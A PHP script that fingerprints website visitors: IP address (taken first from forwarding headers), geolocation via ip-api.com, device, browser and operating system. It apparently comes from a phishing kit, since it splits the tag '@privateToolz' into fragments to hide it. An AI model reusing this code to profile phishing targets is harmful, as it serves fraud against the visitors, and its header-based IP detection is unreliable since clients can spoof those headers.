<?php

if(getenv('HTTP_CLIENT_IP'))       {$_SESSION['ip'] = getenv('HTTP_CLIENT_IP');}
else if(getenv('HTTP_X_FORWARDED_FOR')) {$_SESSION['ip'] = getenv('HTTP_X_FORWARDED_FOR');}
else if(getenv('HTTP_X_FORWARDED'))     {$_SESSION['ip'] = getenv('HTTP_X_FORWARDED');}
else if(getenv('HTTP_FORWARDED_FOR'))   {$_SESSION['ip'] = getenv('HTTP_FORWARDED_FOR');}
else if(getenv('HTTP_FORWARDED'))       {$_SESSION['ip'] = getenv('HTTP_FORWARDED');}
else if(getenv('REMOTE_ADDR'))          {$_SESSION['ip'] = getenv('REMOTE_ADDR');}

$_SESSION['hostname'] = gethostname();

function fetchJsonData($url) {
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);

    if (curl_errno($curl)) {
        echo 'Curl error: ' . curl_error($curl);
        return null;
    }

    curl_close($curl);

    $data = json_decode($response, true);

    if ($data === null) {
        echo "Error decoding JSON.";
        return null;
    }

    return $data;
}
$_SESSION['user_data'] = fetchJsonData("http://ip-api.com/json/".$_SESSION['ip']);
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if($mobile = is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "mobile"))) {$_SESSION['device'] = 'Mobile';}
elseif($tablet = is_numeric(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), "tablet"))) {$_SESSION['device'] = 'Tablet';}
elseif($desktop = !$mobile && !$tablet) {$_SESSION['device'] = 'Desktop';} 

function getUserBrowser(){
$fullUserBrowser = (!empty($_SERVER['HTTP_USER_AGENT'])? 
$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
$userBrowser = explode(')', $fullUserBrowser);
$userBrowser = $userBrowser[count($userBrowser)-1];

if((!$userBrowser || $userBrowser === '' || $userBrowser === ' ' || strpos($userBrowser, 'like Gecko') === 1) && strpos($fullUserBrowser, 'Windows') !== false){
        return 'Internet-Explorer';
}else if((strpos($userBrowser, 'Edge/') !== false || strpos($userBrowser, 'Edg/') !== false) && strpos($fullUserBrowser, 'Windows') !== false){
        return 'Microsoft-Edge';
}else if(strpos($userBrowser, 'Chrome/') === 1 || strpos($userBrowser, 'CriOS/') === 1){
        return 'Google-Chrome';
}else if(strpos($userBrowser, 'Firefox/') !== false || strpos($userBrowser, 'FxiOS/') !== false){
        return 'Mozilla-Firefox';
}else if(strpos($userBrowser, 'Safari/') !== false && strpos($fullUserBrowser, 'Mac') !== false){
        return 'Safari';
}else if(strpos($userBrowser, 'OPR/') !== false && strpos($fullUserBrowser, 'Opera Mini') !== false){
        return 'Opera-Mini';
}else if(strpos($userBrowser, 'OPR/') !== false){
        return 'Opera';
}
return false;
}
$_SESSION['browser'] = getUserBrowser();

$_SESSION['pria'] = '@';
$_SESSION['prib'] = 'priv';
$_SESSION['pric'] = 'ateT';
$_SESSION['prid'] = 'oolz';

function getOS() { 

        global $user_agent;
    
        $os_platform  = "Unknown OS Platform";
    
        $os_array     = array(
                              '/windows nt 10/i'      =>  'Windows 10',
                              '/windows nt 6.3/i'     =>  'Windows 8.1',
                              '/windows nt 6.2/i'     =>  'Windows 8',
                              '/windows nt 6.1/i'     =>  'Windows 7',
                              '/windows nt 6.0/i'     =>  'Windows Vista',
                              '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                              '/windows nt 5.1/i'     =>  'Windows XP',
                              '/windows xp/i'         =>  'Windows XP',
                              '/windows nt 5.0/i'     =>  'Windows 2000',
                              '/windows me/i'         =>  'Windows ME',
                              '/win98/i'              =>  'Windows 98',
                              '/win95/i'              =>  'Windows 95',
                              '/win16/i'              =>  'Windows 3.11',
                              '/macintosh|mac os x/i' =>  'Mac OS X',
                              '/mac_powerpc/i'        =>  'Mac OS 9',
                              '/linux/i'              =>  'Linux',
                              '/ubuntu/i'             =>  'Ubuntu',
                              '/iphone/i'             =>  'iPhone',
                              '/ipod/i'               =>  'iPod',
                              '/ipad/i'               =>  'iPad',
                              '/android/i'            =>  'Android',
                              '/blackberry/i'         =>  'BlackBerry',
                              '/webos/i'              =>  'Mobile'
                        );
    
        foreach ($os_array as $regex => $value)
            if (preg_match($regex, $user_agent))
                $os_platform = $value;
    
        return $os_platform;
    }
    $_SESSION['os'] = getOS();

    function isAppleDevice() {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
        $isAppleMobile = (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false || strpos($userAgent, 'iPod') !== false);
    
        $isAppleComputer = (strpos($userAgent, 'Macintosh') !== false || strpos($userAgent, 'Mac OS X') !== false);
    
        return $isAppleMobile || $isAppleComputer;
    }

    date_default_timezone_set($_SESSION['user_data']['timezone']);
?>
